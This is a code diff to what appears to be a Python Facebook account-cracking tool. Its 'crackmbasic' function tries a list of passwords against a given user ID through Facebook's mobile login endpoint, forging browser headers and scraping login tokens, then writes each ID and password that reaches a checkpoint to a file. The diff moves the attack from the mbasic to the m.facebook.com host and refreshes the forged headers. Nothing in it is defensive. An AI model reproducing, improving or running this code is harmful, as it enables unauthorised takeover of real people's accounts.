@@ -543,13 +543,35 @@ def crackmbasic(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			ses.headers.update({'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
-			p = ses.get('https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fclient_id%3D482073673212185%26state%3D37b028b6339f6f2777d4e2fc0db91682%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3D%252F%252Fwww.kilat.com%252Ffb-callback%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbe57d345-612d-4f3b-851e-a59c6dab44e6%26tp%3Dunspecified&cancel_url=%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D37b028b6339f6f2777d4e2fc0db91682%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook.com/v3.2/dialog/oauth?client_id=482073673212185&state=f51b694bdb918f8ade856ee4124d5aa7&tp=unspecified","flow":"login_no_pin","pass":pw,}
+			ses.headers.update({'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'})
+			p = ses.get('https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fclient_id%3D482073673212185%26state%3D2916998a1f449ba3ee9407b085e05c4c%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3D%252F%252Fwww.kilat.com%252Ffb-callback%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De0e798ae-ef69-48de-a514-1612484d66b2%26tp%3Dunspecified&cancel_url=%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2916998a1f449ba3ee9407b085e05c4c%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
+			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://m.facebook.com/v3.2/dialog/oauth?client_id=482073673212185&state=f51b694bdb918f8ade856ee4124d5aa7&tp=unspecified","flow":"login_no_pin","pass":pw,}
 			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
 			koki+=' m_pixel_ratio=2.625; wd=412x756'
-			heade={'Host': 'mbasic.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://mbasic.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://mbasic.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fclient_id%3D482073673212185%26state%3D37b028b6339f6f2777d4e2fc0db91682%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3D%252F%252Fwww.kilat.com%252Ffb-callback%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dbe57d345-612d-4f3b-851e-a59c6dab44e6%26tp%3Dunspecified&cancel_url=%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D37b028b6339f6f2777d4e2fc0db91682%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
-			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
+			heade={'Host': 'm.facebook.com',
+			'cache-control': 'max-age=0',
+			'content-length': '2435',
+			'scheme': 'https',
+			'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
+			'sec-ch-ua-mobile': '?1',
+			'sec-ch-ua-platform': '"Android"',
+			'upgrade-insecure-requests': '1',
+			'origin': 'https://m.facebook.com',
+			'content-type': 'text/html; charset=utf-8',
+			'user-agent': ua,
+			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+			'x-requested-with': 'XMLHttpRequest',
+			'x-response-format': 'JSONStream',
+			'x-fb-lsd': 'AVrgQ9hWv8k',
+			'sec-fetch-site': 'same-origin',
+			'sec-fetch-mode': 'cors',
+			'sec-fetch-dest': 'empty',
+			'content-type': 'application/x-www-form-urlencoded',
+			'referer': 'https://m.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv3.2%2Fdialog%2Foauth%3Fclient_id%3D482073673212185%26state%3D2916998a1f449ba3ee9407b085e05c4c%26response_type%3Dcode%26sdk%3Dphp-sdk-5.7.0%26redirect_uri%3D%252F%252Fwww.kilat.com%252Ffb-callback%26scope%3Demail%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De0e798ae-ef69-48de-a514-1612484d66b2%26tp%3Dunspecified&cancel_url=%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2916998a1f449ba3ee9407b085e05c4c%23_%3D_&display=page&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
+			'path': '/login/async/wvdp/',
+			'accept-encoding': 'gzip, deflate, br',
+			'accept-language': 'id-ID,id;q=0.9,en-US,en;q=0.9'}
+			po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r ID  : {kk}{idf}{P}          \n PW  : {kk}{pw}          {P}\n User Agent  : {kk}{ua}{P}           \n')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
